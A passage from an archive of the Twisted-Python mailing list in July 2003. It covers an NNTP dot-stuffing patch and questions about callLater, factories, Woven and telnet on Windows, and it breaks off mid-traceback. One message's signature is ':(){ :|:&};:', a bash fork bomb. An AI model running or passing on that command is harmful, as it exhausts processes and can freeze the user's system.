         if line != '.':
+            if line.startswith('.'):
+                line = line[1:]
             self._newLine(line, 0)
         else:
-            self.gotBody('\n'.join(self._endState()))
+            self.gotBody('\n'.join(self._endState())+'\n')
 
 
     def _headerPost(self, (code, message)):
         if code == 340:
-            self.transport.write(self._postText[0])
-            if self._postText[-2:] != '\r\n':
-                self.sendLine('\r\n')
+            self.transport.write(self._postText[0].replace('\n', '\r\n').replace('\r\n.', '\r\n..'))
+            if self._postText[0][-1] != '\n':
+                self.sendLine('')
             self.sendLine('.')
             del self._postText[0]
             self._newState(None, self.postFailed, self._headerPosted)
@@ -748,8 +752,6 @@
             defer = self.factory.backend.postRequest(article)
             defer.addCallbacks(self._gotPost, self._errPost)
         else:
-            if line and line[0] == '.':
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
@@ -792,8 +794,6 @@
             d = self.factory.backend.postRequest(article)
             d.addCallbacks(self._didTakeThis, self._errTakeThis)
         else:
-            if line and line[0] == '.':
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
@@ -859,15 +859,12 @@
         self.currentIndex = index
         self.sendLine('220 %d %s article' % (index, id))
         s = basic.FileSender()
-        d = s.beginFileTransfer(article, self.transport, self.transformChunk)
+        d = s.beginFileTransfer(article, self.transport)
         d.addCallback(self.finishedFileTransfer)
     
     ##   
-    ## Helpers for FileSender
+    ## Helper for FileSender
     ##
-    def transformChunk(self, chunk):
-        return chunk.replace('\n', '\r\n').replace('\r\n.', '\r\n..')
-
     def finishedFileTransfer(self, lastsent):
         if lastsent != '\n':
             line = '\r\n.'
@@ -931,8 +928,8 @@
             body = StringIO.StringIO(body)
         self.currentIndex = index
         self.sendLine('221 %d %s article retrieved' % (index, id))
         s = basic.FileSender()
-        d = s.beginFileTransfer(body, self.transport, self.transformChunk)
+        d = s.beginFileTransfer(body, self.transport)
         d.addCallback(self.finishedFileTransfer)
 
     def _errBody(self, failure):
@@ -1021,8 +1019,6 @@
             
             self.message = ''
         else:
-            if line.startswith('.'):
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
===== twisted/test/test_nntp.py 1.13 vs edited =====
--- 1.13/twisted/test/test_nntp.py	Thu Jul  3 22:55:47 2003
+++ edited/twisted/test/test_nntp.py	Mon Jul 14 00:05:40 2003
@@ -34,6 +34,8 @@
 User-Agent: tin/1.4.5-20010409 ("One More Nightmare") (UNIX) (Linux/2.4.17 (i686))
 
 this is a test
+.
+..
 ...
 lala
 moo
@@ -78,7 +80,7 @@
         self.assertEquals(len(info), 6)
         self.assertEquals(info, GROUP)
         
-        self.postArticle(string.replace(POST_STRING, '\n', '\r\n'))
+        self.postArticle(POST_STRING)
     
     
     def getSubscriptionsFailed(self, error):
@@ -89,7 +91,7 @@
         raise AssertionError("fetchGroup() failed: %s" % (error,))
 
 
-    def postFailed(self, err):
+    def postFailed(self, error):
         raise AssertionError("postArticle() failed: %s" % (error,))
 
 
@@ -98,15 +100,10 @@
 
     
     def gotArticle(self, info):
-        origPost = POST_STRING.replace('\n', '\r\n')
-        origBody = origPost.split('\r\n\r\n')[1]
-        newBody = info.split('\r\n\r\n', 1)[1]
-
-        # XXX The strip shouldn't be necessary, but I don't
-        # know where it needs fixing and I don't want to commit
-        # a broken test.  Tailing whitespace is irrelevant anyway. :)
-        self.assertEquals(origBody.strip(), newBody.strip())
+        origBody = POST_STRING.split('\n\n')[1]
+        newBody = info.split('\n\n', 1)[1]
 
+        self.assertEquals(origBody, newBody)
         
         # We're done
         self.transport.loseConnection()
-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
:huff: v. To compress data using a Huffman code. Various programs that
   use such methods have been called `HUFF' or some variant thereof. Oppose
   {puff}. Compare {crunch}, {compress}.




From itamar at itamarst.org  Sun Jul 13 19:36:03 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 13 Jul 2003 21:36:03 -0400
Subject: [Twisted-Python] t.p.nntp woes
In-Reply-To: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>
References: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>
Message-ID: <20030713213603.43ecbcff.itamar@itamarst.org>

On Mon, 14 Jul 2003 00:53:48 +0200
Matthias Urlichs <smurf at smurf.noris.de> wrote:

> I seem to have found a few bugs in the current NNTP code.

In the future, when you have bugs - post the patch and bugs to the
bugtracker, and then post a short summary to the mailing list and a
pointer to issue in the tracker. That way the patch and the bugs won't
get lost, and the list will know this bug exists.

http://twistedmatrix.com/bugs/

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From smurf at smurf.noris.de  Sun Jul 13 23:47:51 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Mon, 14 Jul 2003 07:47:51 +0200
Subject: [Twisted-Python] t.p.nntp woes
References: <pan.2003.07.13.22.53.44.624640@smurf.noris.de> <20030713213603.43ecbcff.itamar@itamarst.org>
Message-ID: <pan.2003.07.14.05.47.49.305899@smurf.noris.de>

Hi, Itamar Shtull-Trauring wrote:

> On Mon, 14 Jul 2003 00:53:48 +0200
> Matthias Urlichs <smurf at smurf.noris.de> wrote:
> 
>> I seem to have found a few bugs in the current NNTP code.
> 
Copied to the bug tracker.

> In the future, when you have bugs

Nope -- in the future, when I have bugs, I should remember that there is
now a bug tracker. :-/

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
:bring X to its knees: v. [common] To present a machine, operating
   system, piece of software, or algorithm with a load so extreme or
   {pathological} that it grinds to a halt. "To bring a MicroVAX to its
   knees, try twenty users running {vi} -- or four running {EMACS}."
   Compare {hog}.




From tv at twistedmatrix.com  Sun Jul 13 09:46:40 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 13 Jul 2003 18:46:40 +0300
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
References: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030713154640.GB1122@lapdog>

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
> Those of you who heard my talks, either at Europython or Strakt, probably
> remember me going on about how to use reactor.callLater(0,) to partition
> algorithms into bite-size chunks, that would not delay the main loop too
> much. This a topic which is interesting to me. I'm still waiting for glyph

	Nice subject. I'd call it "how to block just a little" ;)

> def os_path_walk(path, visit, arg):
>     d = defer.Deferred()
>     def walk(path):
>         files = os.listdir(path)
>         visit(arg, path, files)
>         for file in files:
>             yield None
>             if os.path.isdir(file):

	You want

              if os.path.isdir(os.path.join(path, file)):


-- 
:(){ :|:&};:



From m at moshez.org  Mon Jul 14 02:25:06 2003
From: m at moshez.org (Moshe Zadka)
Date: 14 Jul 2003 08:25:06 -0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713154640.GB1122@lapdog>
References: <20030713154640.GB1122@lapdog>, <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030714082506.891.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Tommi Virtanen <tv at twistedmatrix.com> wrote:

> >             if os.path.isdir(file):
> 
> 	You want
> 
>               if os.path.isdir(os.path.join(path, file)):

Thanks, you're right.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From rich at enflyer.com  Mon Jul 14 09:51:04 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 11:51:04 -0400
Subject: [Twisted-Python] Woven and deferred models
Message-ID: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>

I spent some time in #twisted this weekend looking for a solution to 
this and got some very helpful advice from phed and radix but no real 
solution to what looks like a bug.

The attached rpy is an example of what I'm trying to do. As is woven 
doesn't even touch the child nodes of my model="main" tag. Add 
view="None" and it at least gives me a trace-back on model="name" which 
is a step beyond not touching it at all.

If anyone has a better approach to this problem I'd appreciate the 
input. Basically I have some models that will take some time to fully 
initialize due to lots of database activity. The sub-models need all of 
this data in place. I'm trying to find a way to fully initialize a 
model before woven continues on to it's sub-models.

rich

-------------- next part --------------
A non-text attachment was scrubbed...
Name: rcur2.rpy
Type: application/applefile
Size: 463 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030714/2b4dad35/attachment-0004.bin>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rcur2.rpy
Type: application/text
Size: 741 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030714/2b4dad35/attachment-0005.bin>

From don at motorola.com  Mon Jul 14 11:53:38 2003
From: don at motorola.com (Don Hiatt)
Date: Mon, 14 Jul 2003 12:53:38 -0500
Subject: [Twisted-Python] Accessing ClientFactory methods?
In-Reply-To: <20030714082506.891.qmail@green.zadka.com>
Message-ID: <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>

Sorry for the stupid questiong, but... :)

Following the client howto I created a simple client
using a ClientFactory, like this:

class echo(Protocol):
	def sendMsg(self, data):
		print "sending", data
		self.transport.write(data)

	def dataReceived(self, data):
		...
		...
		msg = "foo"
		self.sendMsg(foo)


So this works fine, however, how can I access the echo.sendMsg
method from outside the class instance? I can't just use echo.sendMsg(..)
because I never seem to have a "handle" for it. Sorry for such a stupid
namespace issue, but I am just learning. :) (I have tried various ways
to get at the method but either get "sendMsg is unbounded" or that the
method requires an instance to it self). 

As always, thank you so much for your time. 

Cheers,

don




From idmaffett at cs.millersville.edu  Mon Jul 14 12:05:43 2003
From: idmaffett at cs.millersville.edu (Ian D Maffett)
Date: Mon, 14 Jul 2003 14:05:43 -0400 (EDT)
Subject: [Twisted-Python] smtp/pop3
Message-ID: <Pine.LNX.4.44.0307141404000.4117-100000@cs.millersville.edu>

Hello,

I'm a newbie to all of this.  My boss is exploring using python for
various tasks.  We were wondering is if there is an easy way to set up
SMTP/POP3 servers and accounts using twisted?  Are there any examples (not
asking for the solution).

Thanks,
Ian




From Rudy.Schockaert at pandora.be  Mon Jul 14 12:39:04 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 20:39:04 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
Message-ID: <3F12F8C8.7040709@pandora.be>

Hi all,

I got very excited last month when I learned more about Twisted @ 
EuroPython. Now that I finally have some free time, I wanted to learn 
how to use it.
I'm working on Windows XP with Python 2.2.2 and Twisted 1.0.5 and 1.0.6.
As I am reading through the HOWTOs I wanted to try out each example.
Already at the first example I'm having problems.
I ran mktap.py telnet -p 4040 | -u admin -w admin.
Then I ran twistd.py -f telnet.tap and the application seems to run.
When I telnet to port 4040 on localhost I get a prompt for the username 
and for the password. After entering them I don't get a Python prompt at 
all.

Am I doing something wrong? Don't all parts of twisted run on Windows? 
If so, what does and what doesn't?

Thanks in advance,

Rudy
|
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030714/b59f932c/attachment.html>

From itamar at itamarst.org  Mon Jul 14 12:34:00 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 14:34:00 -0400
Subject: [Twisted-Python] Accessing ClientFactory methods?
In-Reply-To: <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
References: <20030714082506.891.qmail@green.zadka.com>
	<FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
Message-ID: <20030714143400.2a9232ef.itamar@itamarst.org>

On Mon, 14 Jul 2003 12:53:38 -0500
"Don Hiatt" <don at motorola.com> wrote:

> So this works fine, however, how can I access the echo.sendMsg
> method from outside the class instance? I can't just use
> echo.sendMsg(..) because I never seem to have a "handle" for it. Sorry
> for such a stupid namespace issue, but I am just learning. :) (I have
> tried various ways to get at the method but either get "sendMsg is
> unbounded" or that the method requires an instance to it self). 

This is a design issue I've been wrestling with. One way to do it is
have a method on the factory that the protocol calls in connectionMade
with itself, and then the logic for sending commands to the client is in
the factory.

Another solution is t.i.protocol.ClientCreator, that lets you get back a
Deferred of the protocol instance.

Any other solutions that people have found? I'd like to be able to make
a single, canonical clean way for doing this.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Mon Jul 14 12:37:12 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 14:37:12 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <3F12F8C8.7040709@pandora.be>
References: <3F12F8C8.7040709@pandora.be>
Message-ID: <20030714143712.536b9a0e.itamar@itamarst.org>

On Mon, 14 Jul 2003 20:39:04 +0200
Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:

> I ran mktap.py telnet -p 4040 | -u admin -w admin.
> Then I ran twistd.py -f telnet.tap and the application seems to run.
> When I telnet to port 4040 on localhost I get a prompt for the
> username and for the password. After entering them I don't get a
> Python prompt at all.

Are you using the Windows telnet client? it is very very broken. Does
this work with PuTTy? Do you get a traceback in the log?

> Am I doing something wrong? Don't all parts of twisted run on Windows?
> 

Yes, they should run just fine. If they don't it's a bug.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From warner at lothar.com  Mon Jul 14 13:11:05 2003
From: warner at lothar.com (Brian Warner)
Date: Mon, 14 Jul 2003 12:11:05 -0700 (PDT)
Subject: [Twisted-Python] Accessing ClientFactory methods?
References: <20030714082506.891.qmail@green.zadka.com>
 <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
 <20030714143400.2a9232ef.itamar@itamarst.org>
Message-ID: <20030714.121105.11712562.warner@lothar.com>

> Any other solutions that people have found? I'd like to be able to make
> a single, canonical clean way for doing this.

I'm not sure that a single technique can be found, because the problem is
going to be different for every application.

The Protocol instance represents a single connection to a single client. You
could have dozens of these connections happening at the same time. From
outside the Protocol object, which one do you want to send a message to? Who
is deciding to send a message to them?

I see two general possibilities:

 The connections are like login sessions to a shell. Each one has some state
 that is scoped to the connection (it goes away when the connection is
 dropped). Messages sent out through the connection are triggered by actions
 caused by commands that came in through the same connection. "/bin/ls"
 results in some text being returned.

   In this case, either the state can be stored in the Protocol subclass, or
   in a companion object which is associated at login time (in the
   connectionMade method).

     class echo(Protocol):
         def connectionMade(self):
             self.session = NewSession()
         def dataReceived(self, data):
             # buffer data, look for command, parse it
             self.session.doCommand(command, self)
         def sendMsg(self, data):
             self.transport.write(data)

   In this scheme, each command gets a handle which it can use to send data
   back to the user. You might also want to give that handle to
   NewSession(), so it can send data to the user at any time (think of the
   unix 'write' command). There might be other tables where the Protocol
   reference needs to be added: a list of connections for each username, a
   list of connections for each MUD player who is in a particular room, a
   list of connections using a particular database.

   Finally, you might also want to keep a global list of all connections (to
   implement the unix 'wall' command which sends a message to *everybody*
   logged in):

     class echo(Protocol):
         def connectionMade(self):
             self.factory.allConnections.append(self)
         def connectionLost(self, reason):
             self.factory.allConnections.remove(self)
     class echofactory(Factory):
         allConnections = []
         def broadcastMsg(self, msg):
             for p in self.allConnections:
                 p.sendMsg(msg)

 The other general scheme would be to allow only a single connection at a
 time. This removes the question of "which one do you want to talk to". Then
 you can store the Protocol instance in the Factory, the Application, or
 even as a global.
           
     class echo(Protocol):
         def connectionMade(self):
             global TheConnection
             assert(TheConnection == None)
             TheConnection = self
         def connectionLost(self, reason):
             global TheConnection
             TheConnection = None
     def sendMessage(msg):
         TheConnection.sendMsg(msg)


Thinking about the issue in terms of multiple simultaneous connections and
how do you decide *which* you want to talk to might make it easier to answer
the question of where to store the Protocol reference.

hope that helps,
 -Brian



From Rudy.Schockaert at pandora.be  Mon Jul 14 13:25:33 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 21:25:33 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <20030714143712.536b9a0e.itamar@itamarst.org>
References: <3F12F8C8.7040709@pandora.be> <20030714143712.536b9a0e.itamar@itamarst.org>
Message-ID: <3F1303AD.9080102@pandora.be>


>
>Are you using the Windows telnet client? it is very very broken. Does
>this work with PuTTy? Do you get a traceback in the log?
>
>  
>
Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
client. I should have known better.
Wouldn't it be a good idea to mention this in the docs? 

I didn't get any traceback, but after hitting a few times CTRL-J I got a 
connection lost.

Best regards,

Rudy


-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030714/98886cfb/attachment.html>

From rich at enflyer.com  Mon Jul 14 13:32:32 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 15:32:32 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
Message-ID: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>

This is a minor patch that solves tge webhappyrealm.py problem 
referenced here:
http://twistedmatrix.com/users/roundup.twistd/twisted/issue72

-------------- next part --------------
A non-text attachment was scrubbed...
Name: guard.py.patch
Type: application/octet-stream
Size: 679 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030714/755ac089/attachment-0002.obj>
-------------- next part --------------


rich

From itamar at itamarst.org  Mon Jul 14 13:29:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 15:29:21 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <3F1303AD.9080102@pandora.be>
References: <3F12F8C8.7040709@pandora.be>
	<20030714143712.536b9a0e.itamar@itamarst.org>
	<3F1303AD.9080102@pandora.be>
Message-ID: <20030714152921.4c01fed5.itamar@itamarst.org>

On Mon, 14 Jul 2003 21:25:33 +0200
Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:

> Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
> client. I should have known better.
> Wouldn't it be a good idea to mention this in the docs? 

Well, then we'd have to make a list of all the ways Windows sucks in
every document we wrote, and that would be far too time consuming.

Anyway, does it work with PuTTy? If not we may have a bug. And I suppose
working with windows telnet client is a semi-worthwhile goal. Add an
issue to the bug tracker perhaps? http://twistedmatrix.com/bugs/

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Mon Jul 14 13:32:09 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 15:32:09 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>
References: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <20030714153209.18fe3e83.itamar@itamarst.org>

On Mon, 14 Jul 2003 15:32:32 -0400
Rich Cavanaugh <rich at enflyer.com> wrote:

> This is a minor patch that solves tge webhappyrealm.py problem 
> referenced here:
> http://twistedmatrix.com/users/roundup.twistd/twisted/issue72

Why not add the patch to the issue tracker? It supports file
attachements I think.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From peter at engcorp.com  Mon Jul 14 13:53:13 2003
From: peter at engcorp.com (Peter Hansen)
Date: Mon, 14 Jul 2003 15:53:13 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
References: <3F12F8C8.7040709@pandora.be>
		<20030714143712.536b9a0e.itamar@itamarst.org>
		<3F1303AD.9080102@pandora.be> <20030714152921.4c01fed5.itamar@itamarst.org>
Message-ID: <3F130A29.41EFF3DA@engcorp.com>

Itamar Shtull-Trauring wrote:
> 
> On Mon, 14 Jul 2003 21:25:33 +0200
> Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:
> 
> > Thanks you very much Itamar. It is indeed that crappy WIndows telnet
> > client. I should have known better.
> > Wouldn't it be a good idea to mention this in the docs?
> 
> Well, then we'd have to make a list of all the ways Windows sucks in
> every document we wrote, and that would be far too time consuming.

At least a reference to specifics about the ways in which the 
crappy Windows telnet client sucks would be helpful, at least
for the archives.  This is the first I've heard of it, and I've
experienced only minor annoyances, never actual defects.  I'm
good at working around Windows suckiness, though, so maybe that's
why it never much bothered me.

Anyway, is there a good page that covers the "very very broken"
nature of Windows telnet?  (Uncharacteristically being too lazy
to google, but I've got a meeting in two minutes.)

-Peter



From rich at enflyer.com  Mon Jul 14 13:59:17 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 15:59:17 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <20030714153209.18fe3e83.itamar@itamarst.org>
Message-ID: <A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>

On Monday, July 14, 2003, at 03:32 PM, Itamar Shtull-Trauring wrote:

> On Mon, 14 Jul 2003 15:32:32 -0400
> Rich Cavanaugh <rich at enflyer.com> wrote:
>
>> This is a minor patch that solves tge webhappyrealm.py problem
>> referenced here:
>> http://twistedmatrix.com/users/roundup.twistd/twisted/issue72
>
> Why not add the patch to the issue tracker? It supports file
> attachements I think.

I figured only the core twisted developers could post to it. It's added 
to the tracker now though.

rich




From itamar at itamarst.org  Mon Jul 14 14:13:12 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 16:13:12 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>
References: <20030714153209.18fe3e83.itamar@itamarst.org>
	<A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <20030714161312.318fe6f2.itamar@itamarst.org>

On Mon, 14 Jul 2003 15:59:17 -0400
Rich Cavanaugh <rich at enflyer.com> wrote:

> I figured only the core twisted developers could post to it. It's
> added to the tracker now though.

Nope, anyone can post - we want other people to do so! (thanks for
writing and submitting the patch.)

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From Rudy.Schockaert at pandora.be  Mon Jul 14 14:32:30 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 22:32:30 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <20030714152921.4c01fed5.itamar@itamarst.org>
References: <3F12F8C8.7040709@pandora.be>	<20030714143712.536b9a0e.itamar@itamarst.org>	<3F1303AD.9080102@pandora.be> <20030714152921.4c01fed5.itamar@itamarst.org>
Message-ID: <3F13135E.6080401@pandora.be>

Itamar Shtull-Trauring wrote:

>On Mon, 14 Jul 2003 21:25:33 +0200
>Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:
>
>  
>
>>Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
>>client. I should have known better.
>>Wouldn't it be a good idea to mention this in the docs? 
>>    
>>
>
>Well, then we'd have to make a list of all the ways Windows sucks in
>every document we wrote, and that would be far too time consuming.
>
>Anyway, does it work with PuTTy? If not we may have a bug. And I suppose
>working with windows telnet client is a semi-worthwhile goal. Add an
>issue to the bug tracker perhaps? http://twistedmatrix.com/bugs/
>
>  
>
Yes, it works great. I only found out something funny. When  I type 
help() suddenly all the interaction happens in the command prompt window 
where I started twistd.py .
After CTRL-Z and enter, control returns to putty.

I created the bug in Issues.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030714/19c44024/attachment.html>

From ritchie at ipowerhouse.com  Mon Jul 14 20:02:55 2003
From: ritchie at ipowerhouse.com (ritchie turner)
Date: Mon, 14 Jul 2003 19:02:55 -0700
Subject: [Twisted-Python] reactor.callLater
Message-ID: <3F1360CF.2090602@ipowerhouse.com>

Hi All

I"m a twisted newbie, and I'd like to know why reactor.callLater
doesn't seem to work when called from the Factory __init__ method,
but it does work if I call it from a regular protocol. I'm trying to set up
a broadcast to all protocalls and am using callLater to schedule a timed
broadcast.

Thanks for any help

R





From dp at twistedmatrix.com  Mon Jul 14 18:39:52 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Mon, 14 Jul 2003 17:39:52 -0700
Subject: [Twisted-Python] Woven and deferred models
In-Reply-To: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>
References: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <D94311A9-B65C-11D7-BF50-000A95864FC4@twistedmatrix.com>

On Monday, July 14, 2003, at 8:51AM, Rich Cavanaugh wrote:

> I spent some time in #twisted this weekend looking for a solution to 
> this and got some very helpful advice from phed and radix but no real 
> solution to what looks like a bug.
>
> The attached rpy is an example of what I'm trying to do. As is woven 
> doesn't even touch the child nodes of my model="main" tag. Add 
> view="None" and it at least gives me a trace-back on model="name" 
> which is a step beyond not touching it at all.

The solution is to use view="Widget" instead of view="None", which maps 
to DefaultWidget, which does nothing at all. Widget at least has a 
minimal amount of code, including the Deferred-model handling code. I 
will try to fix DefaultWidget so that people are not surprised by 
things like this any more.

>
> If anyone has a better approach to this problem I'd appreciate the 
> input. Basically I have some models that will take some time to fully 
> initialize due to lots of database activity. The sub-models need all 
> of this data in place. I'm trying to find a way to fully initialize a 
> model before woven continues on to it's sub-models.

This is exactly what Deferred-Model handling was written for, so you 
are doing it "correctly" :-)




From andrew-twisted at puzzling.org  Mon Jul 14 18:46:56 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 15 Jul 2003 10:46:56 +1000
Subject: [Twisted-Python] reactor.callLater
In-Reply-To: <3F1360CF.2090602@ipowerhouse.com>
References: <3F1360CF.2090602@ipowerhouse.com>
Message-ID: <20030715004656.GA344@frobozz>

On Mon, Jul 14, 2003 at 07:02:55PM -0700, ritchie turner wrote:
> Hi All
> 
> I"m a twisted newbie, and I'd like to know why reactor.callLater
> doesn't seem to work when called from the Factory __init__ method,
> but it does work if I call it from a regular protocol. I'm trying to set up
> a broadcast to all protocalls and am using callLater to schedule a timed
> broadcast.

In general, you should use startFactory for this, rather than __init__, to
support persistence.  If you are using Twisted's plugin infrastructure
(mktap and twistd), then __init__ will be called at mktap time, which is too
early.  If you override the startFactory method instead, it should work --
startFactory is called when the factory is started, rather than when it is
created.

[Hmm... perhaps mktap should do as trial does, and check that the reactor
has no pending timed calls before exiting?  A warning about this sort of
thing could be useful.]

-Andrew.




From ritchie at ipowerhouse.com  Mon Jul 14 22:15:05 2003
From: ritchie at ipowerhouse.com (ritchie turner)
Date: Mon, 14 Jul 2003 21:15:05 -0700
Subject: [Twisted-Python] reactor.callLater
In-Reply-To: <20030715004656.GA344@frobozz>
References: <3F1360CF.2090602@ipowerhouse.com> <20030715004656.GA344@frobozz>
Message-ID: <3F137FC9.5050704@ipowerhouse.com>

Thx, that works well.

R

Andrew Bennetts wrote:

>On Mon, Jul 14, 2003 at 07:02:55PM -0700, ritchie turner wrote:
>  
>
>>Hi All
>>
>>I"m a twisted newbie, and I'd like to know why reactor.callLater
>>doesn't seem to work when called from the Factory __init__ method,
>>but it does work if I call it from a regular protocol. I'm trying to set up
>>a broadcast to all protocalls and am using callLater to schedule a timed
>>broadcast.
>>    
>>
>
>In general, you should use startFactory for this, rather than __init__, to
>support persistence.  If you are using Twisted's plugin infrastructure
>(mktap and twistd), then __init__ will be called at mktap time, which is too
>early.  If you override the startFactory method instead, it should work --
>startFactory is called when the factory is started, rather than when it is
>created.
>
>[Hmm... perhaps mktap should do as trial does, and check that the reactor
>has no pending timed calls before exiting?  A warning about this sort of
>thing could be useful.]
>
>-Andrew.
>
>
>_______________________________________________
>Twisted-Python mailing list
>Twisted-Python at twistedmatrix.com
>http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>
>  
>





From abe at fettig.net  Mon Jul 14 20:33:44 2003
From: abe at fettig.net (Abe Fettig)
Date: 14 Jul 2003 22:33:44 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712230505.27817.qmail@green.zadka.com>
References: <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <1058236423.6090.5.camel@mingus>

On Sat, 2003-07-12 at 19:05, Moshe Zadka wrote:
> Note that your service has a bug if .startService() is called
> twice without an intervening stopService(), and you present
> here for users an ability to tickle that bug. You can probably
> work around in many ways...
> 
> ...but I prefer to having non-parents .enable() or .disable()
> the service. Of course, it can start enabled by default, but
> this way you have a clear distinction which methods are supposed
> to be called by whom.

Hmm, I guess I don't quite understand this.  Why should it matter if a
services is being started by the parent or not?  Is there a chance the
parent could think the service was still running when it really wasn't?

This is an important point to me as I like the idea of letting
administrators turn services on and off without stopping the
application.

> If you call it "application" insteadof "myApp", the next line
> is not needed: instead of "Python"ing it, "twistd -y" it
> [or maybe twistd -ny if you don't want forking]

If I do this, I get an error on shutdown, as it tries to create a
snapshot of the running app:

2003/07/14 22:22 EDT [*Test App*] Saving Test App application to Test
App-shutdown.tap...
2003/07/14 22:22 EDT [*Test App*] Traceback (most recent call last):
          File
"/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32,
in callWithContext
            return func(*args,**kw)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
122, in run
            self.mainLoop()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
130, in mainLoop
            self.runUntilCurrent()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 368,
